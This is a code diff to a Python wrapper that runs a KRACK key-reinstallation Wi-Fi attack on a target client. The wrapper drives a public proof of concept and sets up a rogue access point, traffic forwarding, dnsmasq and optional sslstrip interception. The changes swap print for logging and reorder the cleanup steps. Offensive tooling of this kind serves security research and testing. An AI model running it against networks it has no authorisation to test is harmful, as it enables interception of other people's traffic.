@@ -146,10 +146,10 @@ def main():
     ############# ATTACK ################
     elif options.attack and options.mon and options.rogue and options.target and options.targetSSID and not options.scan:
         try:
-            print("Performing key reinstallation attack")
+            log.info("Performing key reinstallation attack")
          
             # Sets up dependencies before the attack script runs
-            subprocess.call(["./prepareClientAttack.sh"])         
+            subprocess.call(["./prepareClientAttack.sh"])      
             with open('./attackOutput.txt', 'w') as attackOutput:
 
 		        # Gives error if user attempts to combine pcap option with either debugging option.
@@ -208,7 +208,7 @@ def main():
                 # Forward traffic        
                 subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh > /dev/null &"], shell=True)
                 # Start dnsmasq #TODO implement or remove
-                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && dnsmasq -d -C dnsmasq.conf  > /dev/null &"], shell=True)
+                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && dnsmasq -d -C dnsmasq.conf --quiet-dhcp --quiet-dhcp6 --quiet-ra > /dev/null &"], shell=True)
 
                         
                 log.info("Open Wireshark to see traffic")
@@ -223,14 +223,14 @@ def main():
        	    subprocess.call(["clear"], shell=True)
             log.info("Cleaning up and restoring wifi ...")
             subprocess.call(["rm attackOutput.txt"], shell=True)
-            subprocess.call(["./restoreClientWifi.sh"])
             # kills dnsmasq and sslstrip (if user used the sslstrip option)
             subprocess.call(["./killProcesses.sh dnsmasq"], shell=True)
-            # stop forwarding traffic
-            subprocess.call(["sysctl net.ipv4.ip_forward=0 > /dev/null"], shell=True) 
             # kills sslstrip provided that the user chose to enable it 
             if options.sslstrip:
                 subprocess.call(["./killProcesses.sh sslstrip"], shell=True)
+            subprocess.call(["./restoreClientWifi.sh"])
+            # stop forwarding traffic
+            subprocess.call(["sysctl net.ipv4.ip_forward=0 > /dev/null"], shell=True) 
             # move packet captures to the correct folder
             if options.pcap:
                 log.info("Moving packet capture file to reports/")
